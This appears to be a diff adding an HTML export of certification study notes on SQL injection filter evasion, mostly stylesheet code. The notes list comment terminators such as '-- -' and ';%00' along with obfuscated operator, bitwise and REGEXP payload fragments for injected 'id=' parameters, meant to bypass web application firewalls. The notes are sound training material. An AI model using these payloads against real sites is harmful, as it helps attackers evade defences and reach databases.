@@ -1,0 +1,1049 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQLI Filter Evasion</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="4743de89-d28b-49f9-a6da-c6e3963631c5" class="page mono"><header><h1 class="page-title"><strong>SQLI Filter Evasion</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="4baf7bad-0fa4-45ef-89fd-c8c41b0f30b0" class=""><strong>SQL Injection Filter Evasion</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#sql-injection-filter-evasion"></a></strong></h1><p id="b53fdf85-6974-404d-bd0e-1bbac1f57bde" class="">How WAFs try to protect websites</p><p id="e7c256fd-84a6-4fcb-8d25-53ff8b44de48" class="">WAF bypasses</p><h2 id="24a7b6b3-511f-4860-b6ed-a81225d856ca" class=""><strong>Introduction</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#introduction"></a></strong></h2><p id="0a11619b-9068-4450-9051-69c30f433936" class="">SQLi has evolved so much, now we can not only manipulate database and gain access but also DoS, spread malware, phishing, etc</p><h3 id="d15360f6-ce62-4edc-959b-fcbffdbc3a60" class=""><strong>DBMS Gadgets</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#dbms-gadgets"></a></strong></h3><h3 id="c9c9323a-7141-4237-9006-43a15c19c9ae" class=""><strong>Comments</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#comments"></a></strong></h3><p id="89907f82-d3b1-4c11-816e-4e3356ff4fc9" class="">Comments are useful to devs For clarifying particular SQL statements</p><p id="30800033-5864-41d9-8c75-34b82bef702f" class="">Our pourposes: Commenting out the query and obfuscating portions of our code</p><p id="03ebc920-91b2-4861-b578-42bb20971a12" class="">MySQL syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0449861-606a-44b8-96d1-6f979787a19f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://dev.mysql.com/doc/refman/8.0/en/comments.html
+
+#
+* ... */
+-- -
+;%00
+</code></pre><p id="c29312f6-abeb-463d-8ab2-dd9ac0e73362" class="">MSSQL syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1ce0dcc1-ae70-42cd-ba2c-96c6d092a0a9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://msdn.microsoft.com/en-us/library/ff848807.aspx
+/* ... */
+-- -
+;%00
+</code></pre><p id="267cf3a2-39f7-4f72-864f-96b9104452be" class="">Oracle syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ca672073-6bbd-4f09-95ce-5a2d185f00fa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://docs.oracle.com/cd/B19306_01/server.102/b14200/sql_elements006.htm#i31713
+
+/* ... */
+-- -
+</code></pre><h2 id="2382288f-e18d-476d-9567-bfaf7bc35a47" class=""><strong>Functions and Operators</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#functions-and-operators"></a></strong></h2><h3 id="489cced7-1c2e-44f8-99f4-c96520581483" class=""><strong>MySQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mysql"></a></strong></h3><ul id="b06a4281-d0b2-45ed-9119-ad916a0b6a7d" class="bulleted-list"><li style="list-style-type:disc">http://dev.mysql.com/doc/refman/5.7/en/functions.html</li></ul><p id="fac9accf-0493-412f-ba3b-76e882c83355" class="">Magic numbers:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="529d1ce7-f76b-40ee-a744-678231607ce7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name from exployees WHERE id=&#x27;MAGIC-HERE&#x27;
+
+# By manipulating the plus and minus chars we can generate a countless list of the number 1:
+
+id=1
+id=--1
+id=-+-+1
+id=----2---1
+</code></pre><p id="b93827d5-8106-48db-8b01-675e21df1ca6" class="">Bitwise Functions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f5409205-3298-444b-84df-8fa96002c3a5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/4.1/en/bit-functions.html#operator_bitwise-invert
+id=1&amp;1
+id=0|1
+id=13^12
+id=8&gt;&gt;3
+id=~-2
+</code></pre><p id="1bd52101-6c03-41ff-8273-5ffdb40ad580" class="">Logical operator:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="416c39ea-fa47-46ae-bf29-d715f3289133" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/logical-operators.html
+id=NOT 0
+id=!0
+id=!1+1
+id=1&amp;&amp;1
+id=1 AND 1
+id=!0 AND !1+1
+id=1 || NULL
+id=1 || !NULL
+id=1 XOR 1
+</code></pre><p id="c974c95f-9360-4c87-83e5-b7d9aa6c67a7" class="">Reguler Expression Operators (REGEX):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eb907624-ef47-4b5b-8428-9b1e30f1114a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/regexp.html
+id={anything} REGEXP &#x27;.*&#x27;
+id={anything} NOT REGEXP &#x27;{randomkeys}&#x27;
+id={anything} RLIKE &#x27;.*&#x27;
+id={anything} NOT RLIKE &#x27;{randomkeys}&#x27;
